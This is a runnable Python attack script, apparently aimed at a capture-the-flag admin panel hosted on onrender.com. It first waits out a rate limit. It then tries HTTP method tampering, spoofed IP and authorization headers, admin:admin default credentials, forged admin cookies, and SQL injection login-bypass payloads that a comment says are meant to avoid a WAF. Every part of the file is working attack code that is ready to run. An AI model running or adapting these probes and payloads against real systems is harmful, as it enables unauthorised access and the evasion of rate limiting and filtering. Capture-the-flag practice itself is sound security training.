#!/usr/bin/env python3
"""
Wait for rate limit to reset and try a focused attack
"""

import requests
import time
import re
from urllib.parse import urljoin

def wait_for_rate_limit_reset():
    """Wait for rate limit to reset"""
    print("Waiting for rate limit to reset (65 seconds)...")
    time.sleep(65)

def try_simple_admin_access(base_url):
    """Try the simplest possible admin access methods"""
    
    # Method 1: Try accessing admin with different HTTP methods
    admin_url = urljoin(base_url, "/admin")
    
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
    
    print("Trying different HTTP methods on /admin...")
    for method in methods:
        try:
            response = requests.request(method, admin_url, timeout=10)
            print(f"{method} /admin: {response.status_code}")
            
            if response.status_code == 200 and "hw{" in response.text.lower():
                print(f"*** FLAG FOUND via {method}! ***")
                return response.text
            elif response.status_code not in [403, 404, 405]:
                print(f"  Interesting response: {response.text[:200]}")
                
        except Exception as e:
            print(f"  {method} error: {e}")
    
    # Method 2: Try admin with different headers
    print("\nTrying admin access with different headers...")
    headers_to_try = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"User-Agent": "Admin-Bot/1.0"},
        {"Referer": "https://admin-panel-ctf.onrender.com/admin"},
        {"Authorization": "Bearer admin"},
        {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
        {"Cookie": "admin=true"},
        {"Cookie": "isAdmin=1"},
        {"Cookie": "role=admin"},
        {"Cookie": "token=admin"},
    ]
    
    for headers in headers_to_try:
        try:
            response = requests.get(admin_url, headers=headers, timeout=10)
            print(f"Headers {headers}: {response.status_code}")
            
            if response.status_code == 200:
                print(f"  Success with headers: {headers}")
                print(f"  Content: {response.text[:300]}")
                
                if "hw{" in response.text.lower():
                    print("*** FLAG FOUND! ***")
                    return response.text
                    
        except Exception as e:
            print(f"  Error with {headers}: {e}")
    
    # Method 3: Try simple SQL injection that might not trigger WAF
    print("\nTrying very simple SQL injection...")
    login_url = urljoin(base_url, "/login")
    
    simple_payloads = [
        # Maybe the query is like: SELECT * FROM users WHERE username='$user' AND password='$pass'
        # And we can close the first quote and comment out the rest
        {"username": "admin'--", "password": ""},
        {"username": "admin'#", "password": ""},
        {"username": "admin'/*", "password": ""},
        
        # Maybe it's using LIMIT
        {"username": "admin' LIMIT 1--", "password": ""},
        
        # Maybe it's vulnerable to blind injection with simple conditions
        {"username": "admin' AND '1'='1'--", "password": ""},
        {"username": "admin' AND 'a'='a'--", "password": ""},
        
        # Try with different quote styles
        {"username": 'admin"--', "password": ""},
        {"username": 'admin"#', "password": ""},
        
        # Maybe it's using a different SQL syntax
        {"username": "admin'; SELECT 1--", "password": ""},
    ]
    
    for payload in simple_payloads:
        try:
            response = requests.post(login_url, data=payload, timeout=10, allow_redirects=False)
            print(f"Payload {payload}: {response.status_code}")
            
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                print(f"  Redirect: {location}")
                
                if 'admin' in location or 'dashboard' in location:
                    print("  *** POTENTIAL SUCCESS! ***")
                    cookies = response.cookies
                    follow_response = requests.get(urljoin(base_url, location), cookies=cookies)
                    
                    if "hw{" in follow_response.text.lower():
                        print("  *** FLAG FOUND! ***")
                        return follow_response.text
                        
            elif response.status_code == 200:
                try:
                    json_resp = response.json()
                    if json_resp.get('token'):
                        print(f"  Got token: {json_resp.get('token')}")
                        
                        cookies = {'token': json_resp.get('token')}
                        admin_response = requests.get(admin_url, cookies=cookies)
                        
                        if "hw{" in admin_response.text.lower():
                            print("  *** FLAG FOUND IN ADMIN! ***")
                            return admin_response.text
                            
                except:
                    pass
                    
        except Exception as e:
            print(f"  Error: {e}")
        
        time.sleep(1)  # Be extra careful with rate limiting

def main():
    base_url = "https://admin-panel-ctf.onrender.com"
    
    print("=== Focused Admin Panel Attack ===")
    
    # Wait for rate limit to reset
    wait_for_rate_limit_reset()
    
    # Try simple admin access methods
    result = try_simple_admin_access(base_url)
    
    if result and "hw{" in result.lower():
        print("\n*** FLAG FOUND! ***")
        flag_match = re.search(r'hw\{[^}]+\}', result, re.IGNORECASE)
        if flag_match:
            print(f"FLAG: {flag_match.group()}")
        else:
            print("Flag pattern found but couldn't extract:")
            print(result)
    else:
        print("\nNo flag found with these methods.")

if __name__ == "__main__":
    main()